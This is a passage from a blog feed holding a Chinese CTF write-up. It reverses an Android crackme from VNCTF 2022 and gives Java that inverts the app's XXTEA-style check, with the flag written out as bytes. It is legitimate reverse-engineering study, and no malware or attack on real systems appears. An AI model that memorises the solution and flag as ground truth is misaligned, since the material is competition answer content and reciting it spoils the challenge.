class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] bencrypt(<span class="keyword">byte</span>[] input, <span class="keyword">byte</span>[] keys) &#123;</span><br><span class="line">        <span class="keyword">return</span> input.length == <span class="number">0</span> ? input : Haha.toByteArray(Haha.encrypt(Haha.toIntArray(input, <span class="keyword">false</span>), Haha.toIntArray(keys, <span class="keyword">false</span>)), <span class="keyword">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] encrypt(<span class="keyword">int</span>[] input, <span class="keyword">int</span>[] keys) &#123;</span><br><span class="line">        <span class="keyword">int</span> rounds = <span class="number">52</span> / input.length + <span class="number">6</span>;</span><br><span class="line">        <span class="keyword">int</span> rnd_s = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> prev_int = input[input.length - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            rnd_s += -<span class="number">1640531527</span>;</span><br><span class="line">            <span class="keyword">int</span> rnd_e = rnd_s &gt;&gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">int</span> ind;</span><br><span class="line">            <span class="keyword">for</span>(ind = <span class="number">0</span>; ind &lt; input.length - <span class="number">1</span>; ++ind) &#123;</span><br><span class="line">                <span class="keyword">int</span> ind_chr = input[ind] + ((prev_int &gt;&gt;&gt; <span class="number">5</span> ^ input[ind + <span class="number">1</span>] &lt;&lt; <span class="number">2</span>) + (input[ind + <span class="number">1</span>] &gt;&gt;&gt; <span class="number">3</span> ^ prev_int &lt;&lt; <span class="number">4</span>) ^ (rnd_s ^ input[ind + <span class="number">1</span>]) + (keys[ind &amp; <span class="number">3</span> ^ rnd_e] ^ prev_int));</span><br><span class="line">                input[ind] = ind_chr;</span><br><span class="line">                prev_int = ind_chr;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> next_int = input[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">int</span> last_ind = input.length - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">int</span> lc = input[last_ind] + ((prev_int &gt;&gt;&gt; <span class="number">5</span> ^ next_int &lt;&lt; <span class="number">2</span>) + (next_int &gt;&gt;&gt; <span class="number">3</span> ^ prev_int &lt;&lt; <span class="number">4</span>) ^ (rnd_s ^ next_int) + (keys[ind &amp; <span class="number">3</span> ^ rnd_e] ^ prev_int));</span><br><span class="line">            input[last_ind] = lc;</span><br><span class="line">            prev_int = lc;</span><br><span class="line">            --rounds;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(rounds &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> input;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// com.vnctf2022.cm1.IHeihei</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Boolean <span class="title">hcheck</span><span class="params">(String input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] aim = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">68</span>, <span class="number">39</span>, -<span class="number">92</span>, <span class="number">108</span>, -<span class="number">82</span>, -<span class="number">18</span>, <span class="number">72</span>, -<span class="number">55</span>, <span class="number">74</span>, -<span class="number">56</span>, <span class="number">38</span>, <span class="number">11</span>, <span class="number">60</span>, <span class="number">84</span>, <span class="number">97</span>, -<span class="number">40</span>, <span class="number">87</span>, <span class="number">71</span>, <span class="number">99</span>, -<span class="number">82</span>, <span class="number">120</span>, <span class="number">104</span>, <span class="number">0x2F</span>, -<span class="number">71</span>, -<span class="number">58</span>, -<span class="number">57</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">42</span>, <span class="number">38</span>, -<span class="number">44</span>, -<span class="number">39</span>, -<span class="number">60</span>, <span class="number">0x71</span>, -<span class="number">2</span>, <span class="number">92</span>, -<span class="number">75</span>, <span class="number">0x76</span>, -<span class="number">77</span>, <span class="number">50</span>, <span class="number">0x87</span>, <span class="number">43</span>, <span class="number">0x20</span>, -<span class="number">106</span>&#125;;</span><br><span class="line">        <span class="keyword">byte</span>[] _tmp = Haha.bencrypt(input.getBytes(), <span class="string">&quot;H4pPY_VNCTF!!OvO&quot;</span>.getBytes());</span><br><span class="line">        <span class="keyword">if</span>(_tmp.length != aim.length) &#123;</span><br><span class="line">            <span class="keyword">return</span> Boolean.valueOf(<span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; _tmp.length; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span>(_tmp[i] != aim[i]) &#123;</span><br><span class="line">                <span class="keyword">return</span> Boolean.valueOf(<span class="keyword">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Boolean.valueOf(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// com.vnctf2022.cm1.IHeihei</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hi</span><span class="params">(Context arg3)</span> </span>&#123;</span><br><span class="line">        Toast.makeText(arg3, <span class="string">&quot;anothor dex&quot;</span>, <span class="number">1</span>).show();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] toByteArray(<span class="keyword">int</span>[] arg5, <span class="keyword">boolean</span> arg6) &#123;  <span class="comment">// 把intArray分拆为byteArray</span></span><br><span class="line">        <span class="keyword">int</span> n = arg5.length &lt;&lt; <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(arg6) &#123;</span><br><span class="line">            <span class="keyword">int</span> m = arg5[arg5.length - <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span>(m &gt; n) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            n = m;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] result = <span class="keyword">new</span> <span class="keyword">byte</span>[n];</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            result[i] = (<span class="keyword">byte</span>)(arg5[i &gt;&gt;&gt; <span class="number">2</span>] &gt;&gt;&gt; ((i &amp; <span class="number">3</span>) &lt;&lt; <span class="number">3</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span>[] toIntArray(<span class="keyword">byte</span>[] arg7, <span class="keyword">boolean</span> arg8) &#123;</span><br><span class="line">        <span class="keyword">int</span>[] result;</span><br><span class="line">        <span class="keyword">int</span> v0 = (arg7.length &amp; <span class="number">3</span>) == <span class="number">0</span> ? arg7.length &gt;&gt;&gt; <span class="number">2</span> : (arg7.length &gt;&gt;&gt; <span class="number">2</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(arg8) &#123;</span><br><span class="line">            result = <span class="keyword">new</span> <span class="keyword">int</span>[v0 + <span class="number">1</span>];</span><br><span class="line">            result[v0] = arg7.length;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            result = <span class="keyword">new</span> <span class="keyword">int</span>[v0];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; arg7.length; ++i) &#123;</span><br><span class="line">            <span class="keyword">int</span> v3 = i &gt;&gt;&gt; <span class="number">2</span>;</span><br><span class="line">            result[v3] |= (arg7[i] &amp; <span class="number">0xFF</span>) &lt;&lt; ((i &amp; <span class="number">3</span>) &lt;&lt; <span class="number">3</span>);  <span class="comment">// result[i]是一个int，对应输入的每连续4个char</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入的<code>string input</code>先转换成<code>byte[]</code>，然后送入<code>bencrypt(byte[], byte[])</code>进行加密，使用到的密钥是<code>&quot;H4pPY_VNCTF!!OvO&quot;.getBytes()</code>。</p><p>在<code>bencrypt()</code>函数中，先把<code>byte[] input</code>和<code>byte[] keys</code>转换为int序列。其实就是每4个byte合并成int32，然后送入<code>encrypt(int[], int[])</code>进行加密，然后把这个加密函数返回的<code>int[]</code>转换回<code>byte[]</code>，其实就是前面转换的逆过程，把每个int32拆解为4个byte。然后比较得到的<code>byte[]</code>和<code>byte[] aim</code>是否一致。</p><p>具体到<code>encrypt()</code>内部，是一个对input的多轮加密过程。简单来说，每轮加密时，下一轮密文next_input[i]由本轮的input[i+1]、刚刚计算得到的next_input[i-1]、keys[]和两个轮密钥rnd_s和rnd_e计算得到。（input[-1]=input[length-1], input[length]=input[0]）</p><p>$next_input[i] = func(input[i+1], next_input[i-1], keys[], rnd_s, rnd_e), i : 0 \rightarrow n$</p><p>这个过程可以视作顺序的递推，是可逆的，逆操作就是倒序的逆推。</p><p>$input[i]=reverse_func(input[i+1], next_input[i-1], keys[], rnd_s, rnd_e), i : n \rightarrow 0$</p><p>涉及到的三组密钥都是固定的，与输入无关。<br>aim的长度为44，所以input也即flag长度为44，共计加密10轮。</p><p>解密脚本如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">vnctfcm1apk</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] bencrypt(<span class="keyword">byte</span>[] input, <span class="keyword">byte</span>[] keys) &#123;</span><br><span class="line">        <span class="keyword">return</span> input.length == <span class="number">0</span> ? input : toByteArray(encrypt(toIntArray(input, <span class="keyword">false</span>), toIntArray(keys, <span class="keyword">false</span>)), <span class="keyword">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] encrypt(<span class="keyword">int</span>[] input, <span class="keyword">int</span>[] keys) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;input: &quot;</span> + Arrays.toString(input));</span><br><span class="line">        System.out.println(<span class="string">&quot;keys : &quot;</span> + Arrays.toString(keys));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> rounds = <span class="number">52</span> / input.length + <span class="number">6</span>;</span><br><span class="line">        <span class="keyword">int</span> rnd_s = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> prev_int = input[input.length - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            rnd_s += -<span class="number">1640531527</span>;</span><br><span class="line">            <span class="keyword">int</span> rnd_e = rnd_s &gt;&gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span>;</span><br><span class="line">            </span><br><span class="line">            System.out.println(<span class="string">&quot;[rnd_e:&quot;</span> + rnd_e + <span class="string">&quot;, rnd_s:&quot;</span> + rnd_s + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">            <span class="keyword">int</span> ind;</span><br><span class="line">            <span class="keyword">for</span>(ind = <span class="number">0</span>; ind &lt; input.length - <span class="number">1</span>; ++ind) &#123;</span><br><span class="line">                <span class="keyword">int</span> ind_chr = input[ind] + ((prev_int &gt;&gt;&gt; <span class="number">5</span> ^ input[ind + <span class="number">1</span>] &lt;&lt; <span class="number">2</span>) + (input[ind + <span class="number">1</span>] &gt;&gt;&gt; <span class="number">3</span> ^ prev_int &lt;&lt; <span class="number">4</span>) ^ (rnd_s ^ input[ind + <span class="number">1</span>]) + (keys[ind &amp; <span class="number">3</span> ^ rnd_e] ^ prev_int));</span><br><span class="line">                input[ind] = ind_chr;</span><br><span class="line">                prev_int = ind_chr;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> next_int = input[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">int</span> last_ind = input.length - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">int</span> lc = input[last_ind] + ((prev_int &gt;&gt;&gt; <span class="number">5</span> ^ next_int &lt;&lt; <span class="number">2</span>) + (next_int &gt;&gt;&gt; <span class="number">3</span> ^ prev_int &lt;&lt; <span class="number">4</span>) ^ (rnd_s ^ next_int) + (keys[ind &amp; <span class="number">3</span> ^ rnd_e] ^ prev_int));</span><br><span class="line">            input[last_ind] = lc;</span><br><span class="line">            prev_int = lc;</span><br><span class="line">            --rounds;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(rounds &gt; <span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">        System.out.print(<span class="string">&quot;try encrypt: [&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">byte</span> a:toByteArray(input, <span class="keyword">false</span>))&#123;</span><br><span class="line">            System.out.print(a + <span class="string">&quot;,&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;]&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> input;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] decrypt(<span class="keyword">int</span>[] aim, <span class="keyword">int</span>[] keys)&#123;</span><br><span class="line">        <span class="keyword">int</span>[] preaim = <span class="keyword">new</span> <span class="keyword">int</span>[aim.length];</span><br><span class="line">        <span class="keyword">int</span>[] rnd_s = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;-<span class="number">1640531527</span>,<span class="number">1013904242</span>,-<span class="number">626627285</span>,<span class="number">2027808484</span>,<span class="number">387276957</span>,-<span class="number">1253254570</span>,<span class="number">1401181199</span>,-<span class="number">239350328</span>,-<span class="number">1879881855</span>,<span class="number">774553914</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span>[] rnd_e = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> rnd=<span class="number">9</span>;rnd&gt;=<span class="number">0</span>;rnd--)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> ind = aim.length - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">int</span> last_ind = aim.length - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">int</span> prev_int = aim[last_ind-<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">int</span> next_int = aim[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">int</span> lc = aim[last_ind];</span><br><span class="line"></span><br><span class="line">            preaim[last_ind] = (lc - ((prev_int &gt;&gt;&gt; <span class="number">5</span> ^ next_int &lt;&lt; <span class="number">2</span>) + (next_int &gt;&gt;&gt; <span class="number">3</span> ^ prev_int &lt;&lt; <span class="number">4</span>) ^ (rnd_s[rnd] ^ next_int) + (keys[ind &amp; <span class="number">3</span> ^ rnd_e[rnd]] ^ prev_int))  );</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(ind = aim.length - <span class="number">1</span> -<span class="number">1</span>; ind&gt;=<span class="number">0</span>; ind--)&#123;</span><br><span class="line">                <span class="keyword">if</span>(ind==<span class="number">0</span>) prev_int = preaim[aim.length-<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">else</span> prev_int = aim[ind-<span class="number">1</span>];</span><br><span class="line">                next_int = preaim[ind+<span class="number">1</span>];</span><br><span class="line">                preaim[ind] = (aim[ind] - ((prev_int &gt;&gt;&gt; <span class="number">5</span> ^ next_int &lt;&lt; <span class="number">2</span>) + (next_int &gt;&gt;&gt; <span class="number">3</span> ^ prev_int &lt;&lt; <span class="number">4</span>) ^ (rnd_s[rnd] ^ next_int) + (keys[ind &amp; <span class="number">3</span> ^ rnd_e[rnd]] ^ prev_int))  );</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            aim = preaim;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// System.out.println(&quot;ans : &quot; + Arrays.toString(toByteArray(aim)));</span></span><br><span class="line">        System.out.print(<span class="string">&quot;try decrypt: [&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">byte</span> a:toByteArray(aim, <span class="keyword">false</span>))&#123;</span><br><span class="line">            System.out.print(a + <span class="string">&quot;,&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;]&quot;</span>);</span><br><span class="line">        System.out.print(<span class="string">&quot;try flag: &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">byte</span> a:toByteArray(aim, <span class="keyword">false</span>))&#123;</span><br><span class="line">            System.out.print((<span class="keyword">char</span>)a);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> aim;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argc)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> rounds = <span class="number">7</span>; <span class="comment">// 52 / 44 + 6</span></span><br><span class="line">        <span class="keyword">byte</span>[] aim_byte=<span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">68</span>, <span class="number">39</span>, -<span class="number">92</span>, <span class="number">108</span>, -<span class="number">82</span>, -<span class="number">18</span>, <span class="number">72</span>, -<span class="number">55</span>, <span class="number">74</span>, -<span class="number">56</span>, <span class="number">38</span>, <span class="number">11</span>, <span class="number">60</span>, <span class="number">84</span>, <span class="number">97</span>, -<span class="number">40</span>, <span class="number">87</span>, <span class="number">71</span>, <span class="number">99</span>, -<span class="number">82</span>, <span class="number">120</span>, <span class="number">104</span>, <span class="number">0x2F</span>, -<span class="number">71</span>, -<span class="number">58</span>, -<span class="number">57</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">42</span>, <span class="number">38</span>, -<span class="number">44</span>, -<span class="number">39</span>, -<span class="number">60</span>, <span class="number">0x71</span>, -<span class="number">2</span>, <span class="number">92</span>, -<span class="number">75</span>, <span class="number">0x76</span>, -<span class="number">77</span>, <span class="number">50</span>, (<span class="keyword">byte</span>)<span class="number">0x87</span>, <span class="number">43</span>, <span class="number">0x20</span>, -<span class="number">106</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span>[] aim_int =<span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">0b1101100101001000010011101000100</span>,<span class="number">0b11001001010010001110111010101110</span>,<span class="number">0b1011001001101100100001001010</span>,<span class="number">0b11011000011000010101010000111100</span>,<span class="number">0b10101110011000110100011101010111</span>,<span class="number">0b10111001001011110110100001111000</span>,<span class="number">0b100001000000001100011111000110</span>,<span class="number">0b11011001110101000010011000101010</span>,<span class="number">0b1011100111111100111000111000100</span>,<span class="number">0b110010101100110111011010110101</span>,<span class="number">0b10010110001000000010101110000111</span>&#125;;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">byte</span>[] try_byte=<span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">86</span>,<span class="number">78</span>,<span class="number">67</span>,<span class="number">84</span>,<span class="number">70</span>,<span class="number">123</span>,<span class="number">57</span>,<span class="number">51</span>,<span class="number">101</span>,<span class="number">101</span>,<span class="number">55</span>,<span class="number">54</span>,<span class="number">56</span>,<span class="number">56</span>,<span class="number">45</span>,<span class="number">102</span>,<span class="number">50</span>,<span class="number">49</span>,<span class="number">54</span>,<span class="number">45</span>,<span class="number">52</span>,<span class="number">50</span>,<span class="number">99</span>,<span class="number">98</span>,<span class="number">45</span>,<span class="number">97</span>,<span class="number">53</span>,<span class="number">99</span>,<span class="number">50</span>,<span class="number">45</span>,<span class="number">49</span>,<span class="number">57</span>,<span class="number">49</span>,<span class="number">102</span>,<span class="number">102</span>,<span class="number">52</span>,<span class="number">101</span>,<span class="number">52</span>,<span class="number">49</span>,<span class="number">50</span>,<span class="number">98</span>,<span class="number">97</span>,<span class="number">125</span>,<span class="number">0</span>&#125;;</span><br><span class="line">        </span><br><span class="line">        decrypt( toIntArray(aim_byte, <span class="keyword">false</span>), toIntArray(<span class="string">&quot;H4pPY_VNCTF!!OvO&quot;</span>.getBytes(), <span class="keyword">false</span>) );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span>[] ens = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">11</span>];</span><br><span class="line">        ens = encrypt( toIntArray(try_byte, <span class="keyword">false</span>) , toIntArray(<span class="string">&quot;H4pPY_VNCTF!!OvO&quot;</span>.getBytes(), <span class="keyword">false</span>) );</span><br><span class="line">        System.out.println(<span class="string">&quot;encoded msg length = &quot;</span> + toByteArray(ens, <span class="keyword">false</span>).length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span>[] toIntArray(<span class="keyword">byte</span>[] arg7, <span class="keyword">boolean</span> arg8) &#123;</span><br><span class="line">        <span class="keyword">int</span>[] result;</span><br><span class="line">        <span class="keyword">int</span> v0 = (arg7.length &amp; <span class="number">3</span>) == <span class="number">0</span> ? arg7.length &gt;&gt;&gt; <span class="number">2</span> : (arg7.length &gt;&gt;&gt; <span class="number">2</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// System.out.println(&quot;IntArray length:&quot; + v0);</span></span><br><span class="line">        <span class="keyword">if</span>(arg8) &#123;</span><br><span class="line">            result = <span class="keyword">new</span> <span class="keyword">int</span>[v0 + <span class="number">1</span>];</span><br><span class="line">            result[v0] = arg7.length;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            result = <span class="keyword">new</span> <span class="keyword">int</span>[v0];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; arg7.length; ++i) &#123;</span><br><span class="line">            <span class="keyword">int</span> v3 = i &gt;&gt;&gt; <span class="number">2</span>;</span><br><span class="line">            result[v3] |= (arg7[i] &amp; <span class="number">0xFF</span>) &lt;&lt; ((i &amp; <span class="number">3</span>) &lt;&lt; <span class="number">3</span>);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] toByteArray(<span class="keyword">int</span>[] arg5, <span class="keyword">boolean</span> arg6) &#123;</span><br><span class="line">        <span class="keyword">int</span> n = arg5.length &lt;&lt; <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(arg6) &#123;</span><br><span class="line">            <span class="keyword">int</span> m = arg5[arg5.length - <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span>(m &gt; n) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            n = m;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// System.out.println(&quot;ByteArray length:&quot; + n);</span></span><br><span class="line">        <span class="keyword">byte</span>[] result = <span class="keyword">new</span> <span class="keyword">byte</span>[n];</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            result[i] = (<span class="keyword">byte</span>)(arg5[i &gt;&gt;&gt; <span class="number">2</span>] &gt;&gt;&gt; ((i &amp; <span class="number">3</span>) &lt;&lt; <span class="number">3</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可惜时不我Die</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20220212205246.png" alt="image-20220212205239215"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;只有一个Android，我也就只做了个Android，题目链接: &lt;a href=&quot;https://buuoj.cn/match/matches/81/challenges&quot;&gt;https://buuoj.cn/match/matches/81/challenges&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="Android" scheme="http://slient2009.github.io/tags/Android/"/>
    
    <category term="CTF" scheme="http://slient2009.github.io/tags/CTF/"/>
    
  </entry>
  
</feed>
